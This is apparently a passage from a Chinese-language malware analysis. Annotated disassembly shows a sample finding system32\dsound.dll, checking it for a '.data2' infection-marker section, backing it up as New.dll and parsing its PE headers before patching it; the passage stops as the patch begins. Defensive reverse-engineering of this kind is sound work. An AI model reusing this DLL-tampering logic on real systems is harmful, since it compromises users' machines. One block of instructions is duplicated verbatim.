00401C5C   |.   4F           dec     edi                      ; |
00401C5D   |.   C1E9 02     shr     ecx, 2                   ; |
00401C60   |.   F3:A5        rep     movs dword ptr es:[edi], dword p>; |
00401C62   |.   8BCB         mov     ecx, ebx                 ; |
00401C64   |.   8D5424 14     lea     edx, dword ptr [esp+14]    ; |
00401C68   |.   83E1 03     and     ecx, 3                   ; |
00401C6B   |.   50           push    eax                      ; |Attributes => 0
00401C6C   |.   F3:A4        rep     movs byte ptr es:[edi], byte ptr>; |
00401C6E   |.   8BBC24 9C0000>mov    edi, dword ptr [esp+9C]     ; |
00401C75   |.   83C9 FF      or      ecx, FFFFFFFF            ; |
00401C78   |.   F2:AE        repne   scas byte ptr es:[edi]    ; |
00401C7A   |.   F7D1         not     ecx                      ; |
00401C7C   |.   2BF9         sub     edi, ecx                 ; |
00401C7E   |.   6A 03        push    3                        ; |Mode = OPEN\_EXISTING
00401C80   |.   8BF7         mov     esi, edi                 ; |
00401C82   |.   8BD9         mov     ebx, ecx                 ; |
00401C84   |.   8BFA         mov     edi, edx                 ; |
00401C86   |.   83C9 FF      or      ecx, FFFFFFFF            ; |
00401C89   |.   F2:AE        repne   scas byte ptr es:[edi]    ; |
00401C8B   |.   8BCB         mov     ecx, ebx                 ; |
00401C8D   |.   4F           dec     edi                      ; |
00401C8E   |.   C1E9 02     shr     ecx, 2                   ; |
00401C91   |.   F3:A5        rep     movs dword ptr es:[edi], dword p>; |
00401C93   |.   8BCB         mov     ecx, ebx                 ; |
00401C95   |.   50           push    eax                      ; |pSecurity => NULL
00401C96   |.   83E1 03     and     ecx, 3                   ; |
00401C99   |.   6A 01        push    1                        ; |ShareMode = FILE\_SHARE\_READ
00401C9B   |.   8D4424 24     lea     eax, dword ptr [esp+24]    ; |
00401C9F   |.   68 00000080   push    80000000                 ; |Access = GENERIC\_READ
00401CA4   |.   F3:A4        rep     movs byte ptr es:[edi], byte ptr>; |
00401CA6   |.   50           push    eax                      ; |FileName
00401CA7   |.   FF15 08304000 call    dword ptr [<&KERNEL32.CreateFile>; \\打开%windir%\\system32\\dsound.dll
00401CAD   |.   8BF0         mov     esi, eax
00401CAF   |.   83FE FF      cmp     esi, -1
00401CB2   |.   0F85 D8000000 jnz     00401D90                 ;  若成功则跳走
00401CB8   |.   B9 1E000000   mov     ecx, 1E
00401CBD   |.   33C0          xor     eax, eax
00401CBF   |.   8D7C24 10     lea     edi, dword ptr [esp+10]
00401CC3   |.   6A 7B        push    7B                       ; /BufSize = 7B (123.)
00401CC5   |.   F3:AB        rep     stos dword ptr es:[edi]   ; |
00401CC7   |.   66:AB       stos    word ptr es:[edi]          ; |
00401CC9   |.   8D4C24 14     lea     ecx, dword ptr [esp+14]    ; |
00401CCD   |.   51           push    ecx                      ; |Buffer
00401CCE   |.   AA           stos    byte ptr es:[edi]          ; |
00401CCF   |.   FFD5         call    ebp                      ; \\检索系统文件夹路径
00401CD1   |.   8B1D 4C304000 mov    ebx, dword ptr [<&KERNEL32.lstrc>;  kernel32.lstrcatA
00401CD7   |.   8D5424 10     lea     edx, dword ptr [esp+10]
00401CDB   |.   68 84404000   push    00404084                 ; /StringToAdd = "\\..\\system\\"
00401CE0   |.   52           push    edx                      ; |ConcatString
00401CE1   |.   FFD3         call    ebx                      ; \\连接字符串%windir%\\system\\
00401CE3   |.   8B8424 940000>mov   eax, dword ptr [esp+94]
00401CEA   |.   8D4C24 10     lea     ecx, dword ptr [esp+10]
00401CEE   |.   50           push    eax                      ; /StringToAdd
00401CEF   |.   51           push    ecx                      ; |ConcatString
00401CF0   |.   FFD3         call    ebx                      ; \\连接字符串%windir%\\system\\dsound.dll
00401CF2   |.   6A 00        push    0                        ; /hTemplateFile = NULL
00401CF4   |.   6A 00        push    0                        ; |Attributes = 0
00401CF6   |.   6A 03        push    3                        ; |Mode = OPEN\_EXISTING
00401CF8   |.   6A 00        push    0                        ; |pSecurity = NULL
00401CFA   |.   6A 01        push    1                        ; |ShareMode = FILE\_SHARE\_READ
00401CFC   |.   8D5424 24     lea     edx, dword ptr [esp+24]    ; |
00401D00   |.   68 00000080   push    80000000                 ; |Access = GENERIC\_READ
00401D05   |.   52           push    edx                      ; |FileName
00401D06   |.   FF15 08304000 call    dword ptr [<&KERNEL32.CreateFile>; \\打开文件%windir%\\system\\dsound.dll
00401D0C   |.   8BF0         mov     esi, eax
00401D0E   |.   83FE FF      cmp     esi, -1
00401D11   |.   75 6E        jnz     short 00401D81           ;  成功则跳
00401D13   |.   B9 1E000000   mov     ecx, 1E
00401D18   |.   33C0          xor     eax, eax
00401D1A   |.   8D7C24 10     lea     edi, dword ptr [esp+10]
00401D1E   |.   6A 7B        push    7B                       ; /BufSize = 7B (123.)
00401D20   |.   F3:AB        rep     stos dword ptr es:[edi]   ; |
00401D22   |.   66:AB       stos    word ptr es:[edi]          ; |
00401D24   |.   AA           stos    byte ptr es:[edi]          ; |
00401D25   |.   8D4424 14     lea     eax, dword ptr [esp+14]    ; |
00401D29   |.   50           push    eax                      ; |Buffer
00401D2A   |.   FFD5         call    ebp                      ; \\检索系统文件夹路径
00401D2C   |.   8D4C24 10     lea     ecx, dword ptr [esp+10]
00401D30   |.   68 7C404000   push    0040407C                 ; /StringToAdd = "\\..\\\\"
00401D35   |.   51           push    ecx                      ; |ConcatString
00401D36   |.   FFD3         call    ebx                      ; \\连接字符串 C:\\WINDOWS\\system32\\
00401D38   |.   8B9424 940000>mov   edx, dword ptr [esp+94]
00401D3F   |.   8D4424 10     lea     eax, dword ptr [esp+10]
00401D43   |.   52           push    edx                      ; /StringToAdd
00401D44   |.   50           push    eax                      ; |ConcatString
00401D45   |.   FFD3         call    ebx                      ; \\连接字符串%windir%\\system32\\dsound.dll
00401D47   |.   6A 00        push    0                        ; /hTemplateFile = NULL
00401D49   |.   6A 00        push    0                        ; |Attributes = 0
00401D4B   |.   6A 03        push    3                        ; |Mode = OPEN\_EXISTING
00401D4D   |.   6A 00        push    0                        ; |pSecurity = NULL
00401D4F   |.   6A 01        push    1                        ; |ShareMode = FILE\_SHARE\_READ
00401D51   |.   8D4C24 24     lea     ecx, dword ptr [esp+24]    ; |
00401D55   |.   68 00000080   push    80000000                 ; |Access = GENERIC\_READ
00401D5A   |.   51           push    ecx                      ; |FileName
00401D5B   |.   FF15 08304000 call    dword ptr [<&KERNEL32.CreateFile>; \\打开文件%windir%\\system32\\dsound.dll
00401D61   |.   8BF0         mov     esi, eax
00401D63   |.   83FE FF      cmp     esi, -1
00401D66   |.   75 0A        jnz     short 00401D72           ;  成功则继续
00401D68   |.   5F           pop     edi
00401D69   |.   5E           pop     esi
00401D6A   |.   5D           pop     ebp
00401D6B   |.   33C0          xor     eax, eax
00401D6D   |.   5B           pop     ebx
00401D6E   |.   83C4 7C     add     esp, 7C
00401D71   |.   C3           retn
00401D72   |>   8B8424 900000>mov    eax, dword ptr [esp+90]
00401D79   |.   8D5424 10     lea     edx, dword ptr [esp+10]
00401D7D   |.   52           push    edx
00401D7E   |.   50           push    eax
00401D7F   |.   EB 1C        jmp     short 00401D9D
00401D81   |>   8B9424 900000>mov    edx, dword ptr [esp+90]
00401D88   |.   8D4C24 10     lea     ecx, dword ptr [esp+10]
00401D8C   |.   51           push    ecx
00401D8D   |.   52           push    edx
00401D8E   |.   EB 0D        jmp     short 00401D9D
00401D90   |>   8B8C24 900000>mov    ecx, dword ptr [esp+90]
00401D97   |.   8D4424 10     lea     eax, dword ptr [esp+10]
00401D9B   |.   50           push    eax                      ; /String2
00401D9C   |.   51           push    ecx                      ; |String1
00401D9D   |>   FF15 44304000 call    dword ptr [<&KERNEL32.lstrcpyA>] ; \\复制%windir%\\system32\\dsound.dll 字符串到 0012F288 缓冲区
00401DA3   |.   56           push    esi                      ; /hObject
00401DA4   |.   FF15 00304000 call    dword ptr \<&KERNEL32.CloseHandl>; \\关闭句柄
00401DAA   |.   5F           pop     edi
00401DAB   |.   5E           pop     esi
00401DAC   |.   5D           pop     ebp
00401DAD   |.   B8 01000000   mov     eax, 1
00401DB2   |.   5B           pop     ebx
00401DB3   |.   83C4 7C     add     esp, 7C
00401DB6   \\.   C3           retn
```



## 10. 判断 `dsound.dll` 是否存在

代码:

```
004026A1  |.  51              push    ecx                      ; /String
004026A2  |.  FFD6           call    esi                      ; \返回缓冲区内%windir%\system32\dsound.dll 的长度
004026A4  |.  85C0           test    eax, eax
004026A6  |.  7E 3C          jle     short 004026E4            ;  不存在则跳走
```

## 11. 查找区段 `.data2`

正常的 `dsound.dll` 是没有 `.data2` 的,见截图.

代码:



```
00401600   /$   B8 4C100000    mov     eax, 104C
00401605   |.   E8 96150000    call    00402BA0
0040160A   |.   53             push    ebx
0040160B   |.   8B8424 541000>mov     eax, dword ptr [esp+1054]
00401612   |.   55             push    ebp
00401613   |.   56             push    esi
00401614   |.   57             push    edi
00401615   |.   6A 00          push    0                              ; /hTemplateFile = NULL
00401617   |.   68 00000008    push    8000000                        ; |Attributes = SEQUENTIAL_SCAN
0040161C   |.   6A 03          push    3                              ; |Mode = OPEN_EXISTING
0040161E   |.   6A 00          push    0                              ; |pSecurity = NULL
00401620   |.   6A 01          push    1                              ; |ShareMode = FILE_SHARE_READ
00401622   |.   68 00000080    push    80000000                       ; |Access = GENERIC_READ
00401627   |.   50             push    eax                            ; |FileName
00401628   |.   C74424 34 000>mov     dword ptr [esp+34], 0          ; |
00401630   |.   FF15 08304000  call    dword ptr [<&KERNEL32.CreateFile>; \打开文件%windir%\system32\dsound.dll
00401636   |.   8BF0          mov     esi, eax
00401638   |.   83FE FF       cmp     esi, -1
0040163B   |.   75 0D         jnz     short 0040164A                 ;   成功则继续
0040163D   |.   5F             pop     edi
0040163E   |.   5E             pop     esi
0040163F   |.   5D             pop     ebp
00401640   |.   33C0          xor     eax, eax
00401642   |.   5B             pop     ebx
00401643   |.   81C4 4C100000  add     esp, 104C
00401649   |.   C3             retn
0040164A   |>   8D4C24 10     lea     ecx, dword ptr [esp+10]
0040164E   |.   6A 00          push    0                              ; /pOverlapped = NULL
00401650   |.   51             push    ecx                            ; |pBytesRead
00401651   |.   8D5424 64     lea     edx, dword ptr [esp+64]        ; |
00401655   |.   6A 40          push    40                             ; |BytesToRead = 40 (64.)
00401657   |.   52             push    edx                            ; |Buffer
00401658   |.   56             push    esi                            ; |hFile
00401659   |.   FF15 24304000  call    dword ptr [<&KERNEL32.ReadFile>] ; \读取 0x40 字节到 dsound.0012E22C 处的数据
0040165F   |.   85C0          test    eax, eax
00401661   |.   75 14         jnz     short 00401677                 ;   成功则继续
00401663   |.   56             push    esi                            ; /hObject
00401664   |.   FF15 00304000  call    dword ptr [<&KERNEL32.CloseHandl>; \关闭句柄
0040166A   |.   5F             pop     edi
0040166B   |.   5E             pop     esi
0040166C   |.   5D             pop     ebp
0040166D   |.   33C0          xor     eax, eax
0040166F   |.   5B             pop     ebx
00401670   |.   81C4 4C100000  add     esp, 104C
00401676   |.   C3             retn
00401677   |>   8BBC24 980000>mov     edi, dword ptr [esp+98]
0040167E   |.   8B2D 28304000  mov     ebp, dword ptr [<&KERNEL32.SetFi>;   kernel32.SetFilePointer
00401684   |.   6A 00          push    0                              ; /Origin = FILE_BEGIN
00401686   |.   6A 00          push    0                              ; |pOffsetHi = NULL
00401688   |.   8D5F 28       lea     ebx, dword ptr [edi+28]        ; |
0040168B   |.   53             push    ebx                            ; |OffsetLo
0040168C   |.   56             push    esi                            ; |hFile
0040168D   |.   FFD5          call    ebp                            ; \指针移至文件开头 0x110 字节处
0040168F   |.   8D4424 10     lea     eax, dword ptr [esp+10]
00401693   |.   6A 00          push    0                              ; /pOverlapped = NULL
00401695   |.   50             push    eax                            ; |pBytesRead
00401696   |.   8D4C24 38     lea     ecx, dword ptr [esp+38]        ; |
0040169A   |.   6A 04          push    4                              ; |BytesToRead = 4
0040169C   |.   51             push    ecx                            ; |Buffer
0040169D   |.   56             push    esi                            ; |hFile
0040169E   |.   FF15 24304000  call    dword ptr [<&KERNEL32.ReadFile>] ; \读取从 0x4 字节到 dsound.0012E22C 处的数据
004016A4   |.   85C0          test    eax, eax
004016A6   |.   75 14         jnz     short 004016BC                 ;   成功则继续
004016A8   |.   56             push    esi                            ; /hObject
004016A9   |.   FF15 00304000  call    dword ptr [<&KERNEL32.CloseHandl>; \关闭句柄
004016AF   |.   5F             pop     edi
004016B0   |.   5E             pop     esi
004016B1   |.   5D             pop     ebp
004016B2   |.   33C0          xor     eax, eax
004016B4   |.   5B             pop     ebx
004016B5   |.   81C4 4C100000  add     esp, 104C
004016BB   |.   C3             retn
004016BC   |>   6A 00          push    0
004016BE   |.   6A 00          push    0
004016C0   |.   53             push    ebx
004016C1   |.   56             push    esi
004016C2   |.   FFD5          call    ebp                            ;   指针移至文件开头 0x110 字节处
004016C4   |.   33D2          xor     edx, edx
004016C6   |.   33DB          xor     ebx, ebx
004016C8   |.   895424 1E     mov     dword ptr [esp+1E], edx
004016CC   |.   53             push    ebx
004016CD   |.   895424 26     mov     dword ptr [esp+26], edx
004016D1   |.   8D47 04       lea     eax, dword ptr [edi+4]
004016D4   |.   895424 2A     mov     dword ptr [esp+2A], edx
004016D8   |.   53             push    ebx
004016D9   |.   895424 32     mov     dword ptr [esp+32], edx
004016DD   |.   50             push    eax
004016DE   |.   56             push    esi
004016DF   |.   66:895C24 2C   mov     word ptr [esp+2C], bx
004016E4   |.   66:895424 3E   mov     word ptr [esp+3E], dx
004016C4   |.   33D2          xor     edx, edx
004016C6   |.   33DB          xor     ebx, ebx
004016C8   |.   895424 1E     mov     dword ptr [esp+1E], edx
004016CC   |.   53             push    ebx
004016CD   |.   895424 26     mov     dword ptr [esp+26], edx
004016D1   |.   8D47 04       lea     eax, dword ptr [edi+4]
004016D4   |.   895424 2A     mov     dword ptr [esp+2A], edx
004016D8   |.   53             push    ebx
004016D9   |.   895424 32     mov     dword ptr [esp+32], edx
004016DD   |.   50             push    eax
004016DE   |.   56             push    esi
004016DF   |.   66:895C24 2C   mov     word ptr [esp+2C], bx
004016E4   |.   66:895424 3E   mov     word ptr [esp+3E], dx
004016E9   |.   FFD5          call    ebp                            ;   指针移至文件开头 0xEC 字节处
004016EB   |.   8D4C24 10     lea     ecx, dword ptr [esp+10]
004016EF   |.   53             push    ebx                            ; /pOverlapped
004016F0   |.   51             push    ecx                            ; |pBytesRead
004016F1   |.   8D5424 24     lea     edx, dword ptr [esp+24]        ; |
004016F5   |.   6A 14          push    14                             ; |BytesToRead = 14 (20.)
004016F7   |.   52             push    edx                            ; |Buffer
004016F8   |.   56             push    esi                            ; |hFile
004016F9   |.   FF15 24304000  call    dword ptr [<&KERNEL32.ReadFile>] ; \读取从开头 0x14 字节到 dsound.0012E22C 的数据
004016FF   |.   81C7 F8000000  add     edi, 0F8
00401705   |.   53             push    ebx
00401706   |.   53             push    ebx
00401707   |.   57             push    edi
00401708   |.   56             push    esi
00401709   |.   FFD5          call    ebp                            ;   指针移至开头 0x1E0 字节处
0040170B   |.   66:395C24 1E   cmp     word ptr [esp+1E], bx
00401710   |.   76 7B         jbe     short 0040178D
00401712   |.   83C7 28       add     edi, 28
00401715   |.   897C24 14     mov     dword ptr [esp+14], edi
00401719   |>   B9 09000000   /mov     ecx, 9
0040171E   |.   33C0          |xor     eax, eax
00401720   |.   8D7C24 35     |lea     edi, dword ptr [esp+35]
00401724   |.   C64424 34 00  |mov     byte ptr [esp+34], 0
00401729   |.   F3:AB         |rep     stos dword ptr es:[edi]
0040172B   |.   66:AB         |stos    word ptr es:[edi]
0040172D   |.   AA             |stos    byte ptr es:[edi]
0040172E   |.   8D4424 10     |lea     eax, dword ptr [esp+10]
00401732   |.   6A 00          |push    0                              ; /pOverlapped = NULL
00401734   |.   50             |push    eax                            ; |pBytesRead
00401735   |.   8D4C24 3C     |lea     ecx, dword ptr [esp+3C]        ; |
00401739   |.   6A 28          |push    28                             ; |BytesToRead = 28 (40.)
0040173B   |.   51             |push    ecx                            ; |Buffer
0040173C   |.   56             |push    esi                            ; |hFile
0040173D   |.   FF15 24304000  |call    dword ptr [<&KERNEL32.ReadFile>>; \读取 0x28 字节到 dsound.0012E22C 的数据
00401743   |.   8D5424 34     |lea     edx, dword ptr [esp+34]
00401747   |.   68 50404000   |push    00404050                       ; /s2 = ".data2"
0040174C   |.   52             |push    edx                            ; |s1
0040174D   |.   FF15 A4304000  |call    dword ptr [<&MSVCRT._stricmp>]   ; \比较字符串区段名和.data2
00401753   |.   83C4 08       |add     esp, 8
00401756   |.   85C0          |test    eax, eax
00401758   |.   74 23         |je      short 0040177D                 ;   找到.data2 则跳走
0040175A   |.   8B7C24 14     |mov     edi, dword ptr [esp+14]
0040175E   |.   6A 00          |push    0
00401760   |.   6A 00          |push    0
00401762   |.   57             |push    edi
00401763   |.   56             |push    esi
00401764   |.   FFD5          |call    ebp                            ;   将指针移至下一个区段起始处
00401766   |.   8B4424 1E     |mov     eax, dword ptr [esp+1E]
0040176A   |.   43             |inc     ebx
0040176B   |.   25 FFFF0000   |and     eax, 0FFFF
00401770   |.   83C7 28       |add     edi, 28
00401773   |.   3BD8          |cmp     ebx, eax
00401775   |.   897C24 14     |mov     dword ptr [esp+14], edi
00401779   |.^ 7C 9E         \jl      short 00401719                 ;   循环读取区段,比较
0040177B   |.   EB 10         jmp     short 0040178D                 ;   没有找到则结束
0040177D   |>\8B4424 40     mov     eax, dword ptr [esp+40]
00401781   |.   85C0          test    eax, eax
00401783   |.   74 08         je      short 0040178D
00401785   |.   C74424 18 010>mov     dword ptr [esp+18], 1
0040178D   |>   56             push    esi                            ; /hObject
0040178E   |.   FF15 00304000  call    dword ptr [<&KERNEL32.CloseHandl>; \关闭句柄
00401794   |.   8B4424 18     mov     eax, dword ptr [esp+18]
00401798   |.   5F             pop     edi
00401799   |.   5E             pop     esi
0040179A   |.   5D             pop     ebp
0040179B   |.   5B             pop     ebx
0040179C   |.   81C4 4C100000  add     esp, 104C
004017A2   \\.   C3             retn
```



12. 将 `%windir%\\system32\\dsound.dll` 备份为 `%windir%\\system32\\New.dll`，读取相关数据，为 Patch `New.dll` 做准备

```
代码:
```



```
00401DC0   $  55              push    ebp
00401DC1   .  8BEC           mov     ebp, esp
00401DC3   .  81EC 98030000 sub     esp, 398
00401DC9   .  53             push    ebx
00401DCA   .  56             push    esi
00401DCB   .  57             push    edi
00401DCC   .  C685 6CFCFFFF>mov     byte ptr [ebp-394], 0
00401DD3   .  B9 3F000000    mov     ecx, 3F
00401DD8   .  33C0           xor     eax, eax
00401DDA   .  8DBD 6DFCFFFF lea     edi, dword ptr [ebp-393]
00401DE0   .  F3:AB          rep     stos dword ptr es:[edi]
00401DE2   .  66:AB          stos    word ptr es:[edi]
00401DE4   .  AA             stos    byte ptr es:[edi]
00401DE5   .  68 00010000    push    100                         ; /BufSize = 100 (256.)
00401DEA   .  8D85 6CFCFFFF lea     eax, dword ptr [ebp-394]     ; |
00401DF0   .  50             push    eax                         ; |Buffer
00401DF1   .  FF15 7C304000 call    dword ptr [<&KERNEL32.GetSystemD>; \检索系统文件夹路径
00401DF7   .  BF 90404000    mov     edi, 00404090
00401DFC   .  8D95 6CFCFFFF lea     edx, dword ptr [ebp-394]
00401E02   .  83C9 FF       or      ecx, FFFFFFFF
00401E05   .  33C0           xor     eax, eax
00401E07   .  F2:AE          repne   scas byte ptr es:[edi]
00401E09   .  F7D1           not     ecx
00401E0B   .  2BF9           sub     edi, ecx
00401E0D   .  8BF7           mov     esi, edi
00401E0F   .  8BD9           mov     ebx, ecx
00401E11   .  8BFA           mov     edi, edx
00401E13   .  83C9 FF       or      ecx, FFFFFFFF
00401E16   .  33C0           xor     eax, eax
00401E18   .  F2:AE          repne   scas byte ptr es:[edi]
00401E1A   .  83C7 FF       add     edi, -1
00401E1D   .  8BCB           mov     ecx, ebx
00401E1F   .  C1E9 02       shr     ecx, 2
00401E22   .  F3:A5          rep     movs dword ptr es:[edi], dword p>
00401E24   .  8BCB           mov     ecx, ebx
00401E26   .  83E1 03       and     ecx, 3
00401E29   .  F3:A4          rep     movs byte ptr es:[edi], byte ptr>
00401E2B   .  BF BC404000    mov     edi, 004040BC               ;   ASCII "New.dll"
00401E30   .  8D95 6CFCFFFF lea     edx, dword ptr [ebp-394]
00401E36   .  83C9 FF       or      ecx, FFFFFFFF
00401E39   .  33C0           xor     eax, eax
00401E3B   .  F2:AE          repne   scas byte ptr es:[edi]
00401E3D   .  F7D1           not     ecx
00401E3F   .  2BF9           sub     edi, ecx
00401E41   .  8BF7           mov     esi, edi
00401E43   .  8BD9           mov     ebx, ecx
00401E45   .  8BFA           mov     edi, edx
00401E47   .  83C9 FF       or      ecx, FFFFFFFF
00401E4A   .  33C0           xor     eax, eax
00401E4C   .  F2:AE          repne   scas byte ptr es:[edi]
00401E4E   .  83C7 FF       add     edi, -1
00401E51   .  8BCB           mov     ecx, ebx
00401E53   .  C1E9 02       shr     ecx, 2
00401E56   .  F3:A5          rep     movs dword ptr es:[edi], dword p>
00401E58   .  8BCB           mov     ecx, ebx
00401E5A   .  83E1 03       and     ecx, 3
00401E5D   .  F3:A4          rep     movs byte ptr es:[edi], byte ptr>
00401E5F   .  6A 00          push    0                             ; /FailIfExists = FALSE
00401E61   .  8D85 6CFCFFFF lea     eax, dword ptr [ebp-394]      ; |
00401E67   .  50             push    eax                         ; |NewFileName
00401E68   .  8B4D 08       mov     ecx, dword ptr [ebp+8]       ; |
00401E6B   .  51             push    ecx                         ; |ExistingFileName
00401E6C   .  FF15 70304000 call    dword ptr [<&KERNEL32.CopyFileA>]; \将%windir%\system32\dsound.dll 复制到%windir%\system32\New.dll
00401E72   .  85C0          test    eax, eax
00401E74   .  75 15         jnz     short 00401E8B              ;   成功则跳
00401E76   .  68 AC404000   push    004040AC                    ; /format = TAB,TAB,"bak faild",LF,""
00401E7B   .  FF15 9C304000 call    dword ptr [<&MSVCRT.printf>]     ; \printf
00401E81   .  83C4 04       add     esp, 4
00401E84   .  33C0           xor     eax, eax
00401E86   .  E9 DE070000   jmp     00402669
00401E8B   >  6A 00          push    0                             ; /hTemplateFile = NULL
00401E8D   .  6A 00          push    0                             ; |Attributes = 0
00401E8F   .  6A 03          push    3                             ; |Mode = OPEN_EXISTING
00401E91   .  6A 00          push    0                             ; |pSecurity = NULL
00401E93   .  6A 01          push    1                             ; |ShareMode = FILE_SHARE_READ
00401E95   .  68 00000080   push    80000000                      ; |Access = GENERIC_READ
00401E9A   .  8B55 08       mov     edx, dword ptr [ebp+8]       ; |
00401E9D   .  52             push    edx                         ; |FileName
00401E9E   .  FF15 08304000 call    dword ptr [<&KERNEL32.CreateFile>; \打开文件%windir%\system32\dsound.dll
00401EA4   .  8985 7CFDFFFF mov     dword ptr [ebp-284], eax
00401EAA   .  6A 00          push    0                             ; /Origin = FILE_BEGIN
00401EAC   .  6A 00          push    0                             ; |pOffsetHi = NULL
00401EAE   .  6A 3C          push    3C                            ; |OffsetLo = 3C (60.)
00401EB0   .  8B85 7CFDFFFF mov     eax, dword ptr [ebp-284]     ; |
00401EB6   .  50             push    eax                         ; |hFile
00401EB7   .  FF15 28304000 call    dword ptr [<&KERNEL32.SetFilePoi>; \指针移至文件开头 0x3C 字节处
00401EBD   .  C785 90FDFFFF>mov     dword ptr [ebp-270], 0
00401EC7   .  6A 00          push    0                             ; /pOverlapped = NULL
00401EC9   .  8D8D C8FDFFFF lea     ecx, dword ptr [ebp-238]     ; |
00401ECF   .  51             push    ecx                         ; |pBytesRead
00401ED0   .  6A 04          push    4                             ; |BytesToRead = 4
00401ED2   .  8D95 90FDFFFF lea     edx, dword ptr [ebp-270]     ; |
00401ED8   .  52             push    edx                         ; |Buffer
00401ED9   .  8B85 7CFDFFFF mov     eax, dword ptr [ebp-284]     ; |
00401EDF   .  50             push    eax                         ; |hFile
00401EE0   .  FF15 24304000 call    dword ptr [<&KERNEL32.ReadFile>] ; \读取从 0x4C 到 dsound.0012F03C 的数据
00401EE6   .  6A 00          push    0                             ; /Origin = FILE_BEGIN
00401EE8   .  6A 00          push    0                             ; |pOffsetHi = NULL
00401EEA   .  8B8D 90FDFFFF mov     ecx, dword ptr [ebp-270]     ; |
00401EF0   .  51             push    ecx                         ; |OffsetLo
00401EF1   .  8B95 7CFDFFFF mov     edx, dword ptr [ebp-284]     ; |
00401EF7   .  52             push    edx                         ; |hFile
00401EF8   .  FF15 28304000 call    dword ptr [<&KERNEL32.SetFilePoi>; \指针移至文件开头 0xE8 字节处
00401EFE   .  6A 00          push    0                             ; /pOverlapped = NULL
00401F00   .  8D85 C8FDFFFF lea     eax, dword ptr [ebp-238]     ; |
00401F06   .  50             push    eax                         ; |pBytesRead
00401F07   .  68 F8000000   push    0F8                           ; |BytesToRead = F8 (248.)
00401F0C   .  8D8D DCFDFFFF lea     ecx, dword ptr [ebp-224]     ; |
00401F12   .  51             push    ecx                         ; |Buffer
00401F13   .  8B95 7CFDFFFF mov     edx, dword ptr [ebp-284]     ; |
00401F19   .  52             push    edx                         ; |hFile
00401F1A   .  FF15 24304000 call    dword ptr [<&KERNEL32.ReadFile>] ; \读取从 0xF8 到 dsound.0012F03C 的数据
00401F20   .  8B85 E2FDFFFF mov     eax, dword ptr [ebp-21E]
00401F26   .  25 FFFF0000   and     eax, 0FFFF
00401F2B   .  8985 6CFDFFFF mov     dword ptr [ebp-294], eax
00401F31   .  8B8D 04FEFFFF mov     ecx, dword ptr [ebp-1FC]
00401F37   .  898D 80FDFFFF mov     dword ptr [ebp-280], ecx
00401F3D   .  8B95 14FEFFFF mov     edx, dword ptr [ebp-1EC]
00401F43   .  8995 68FCFFFF mov     dword ptr [ebp-398], edx
00401F49   .  8B85 18FEFFFF mov     eax, dword ptr [ebp-1E8]
00401F4F   .  8985 8CFDFFFF mov     dword ptr [ebp-274], eax
00401F55   .  B9 0A000000   mov     ecx, 0A
00401F5A   .  33C0           xor     eax, eax
00401F5C   .  8D7D D8       lea     edi, dword ptr [ebp-28]
00401F5F   .  F3:AB          rep     stos dword ptr es:[edi]
00401F61   .  6A 00          push    0                             ; /Origin = FILE_BEGIN
00401F63   .  6A 00          push    0                             ; |pOffsetHi = NULL
00401F65   .  8B8D 90FDFFFF mov     ecx, dword ptr [ebp-270]     ; |
00401F6B   .  81C1 F8000000 add     ecx, 0F8                      ; |
00401F71   .  51             push    ecx                         ; |OffsetLo
00401F72   .  8B95 7CFDFFFF mov     edx, dword ptr [ebp-284]     ; |
00401F78   .  52             push    edx                         ; |hFile
00401F79   .  FF15 28304000 call    dword ptr [<&KERNEL32.SetFilePoi>; \指针移至文件开头 0x1E0 字节处
00401F7F   .  C785 94FDFFFF>mov     dword ptr [ebp-26C], 0
00401F89   .  EB 0F         jmp     short 00401F9A
00401F8B   >  8B85 94FDFFFF mov     eax, dword ptr [ebp-26C]
00401F91   .  83C0 01       add     eax, 1
00401F94   .  8985 94FDFFFF mov     dword ptr [ebp-26C], eax
00401F9A   >  8B8D 94FDFFFF mov     ecx, dword ptr [ebp-26C]
00401FA0   .  3B8D 6CFDFFFF cmp     ecx, dword ptr [ebp-294]
00401FA6   .  7D 21         jge     short 00401FC9
00401FA8   .  6A 00          push    0                             ; /pOverlapped = NULL
00401FAA   .  8D95 C8FDFFFF lea     edx, dword ptr [ebp-238]     ; |
00401FB0   .  52             push    edx                         ; |pBytesRead
00401FB1   .  6A 28         push    28                            ; |BytesToRead = 28 (40.)
00401FB3   .  8D85 98FDFFFF lea     eax, dword ptr [ebp-268]     ; |
00401FB9   .  50             push    eax                         ; |Buffer
00401FBA   .  8B8D 7CFDFFFF mov     ecx, dword ptr [ebp-284]     ; |
00401FC0   .  51             push    ecx                         ; |hFile
00401FC1   .  FF15 24304000 call    dword ptr [<&KERNEL32.ReadFile>] ; \读取从 0x28 到 dsound.0012F03C 的数据
00401FC7   .^ EB C2         jmp     short 00401F8B              ;   循环
00401FC9   >  6A 00          push    0                             ; /hTemplateFile = NULL
00401FCB   .  6A 00          push    0                             ; |Attributes = 0
00401FCD   .  6A 03          push    3                             ; |Mode = OPEN_EXISTING
00401FCF   .  6A 00          push    0                             ; |pSecurity = NULL
00401FD1   .  6A 01          push    1                             ; |ShareMode = FILE_SHARE_READ
00401FD3   .  6A 03          push    3                             ; |Access = 3
00401FD5   .  8D95 6CFCFFFF lea     edx, dword ptr [ebp-394]     ; |
00401FDB   .  52             push    edx                         ; |FileName
00401FDC   .  FF15 08304000 call    dword ptr [<&KERNEL32.CreateFile>; \打开%windir%\system32\New.dll
00401FE2   .  8985 D4FEFFFF mov     dword ptr [ebp-12C], eax
00401FE8   .  83BD D4FEFFFF>cmp     dword ptr [ebp-12C], -1
00401FEF   .  75 14         jnz     short 00402005              ;   成功则跳
00401FF1   .  8B85 7CFDFFFF mov     eax, dword ptr [ebp-284]
00401FF7   .  50             push    eax                         ; /hObject
00401FF8   .  FF15 00304000 call    dword ptr [<&KERNEL32.CloseHandl>; \CloseHandle
00401FFE   .  33C0           xor     eax, eax
00402000   .  E9 64060000   jmp     00402669
00402005   >  E9 5A060000   jmp     00402664
```



### 13. Patch `New.dll`

代码：

```
00402161   > /8D05 0A204000 lea     eax, dword ptr [40200A]
00402167   . |8985 D8FDFFFF mov     dword ptr [ebp-228], eax
0040216D   . |8D1D 41214000 lea     ebx, dword ptr [402141]
00402173   . |2BD8          sub     ebx, eax
00402175   . |899D 70FDFFFF mov     dword ptr [ebp-290], ebx
0040217B   . |8D05 0A204000 lea     eax, dword ptr [40200A]
00402181   . |8D1D 1E214000 lea     ebx, dword ptr [40211E]
00402187   . |2BD8          sub     ebx, eax
00402189   . |899D 88FDFFFF mov     dword ptr [ebp-278], ebx
0040218F   . |6A 02         push    2                            ; /Origin = FILE_END
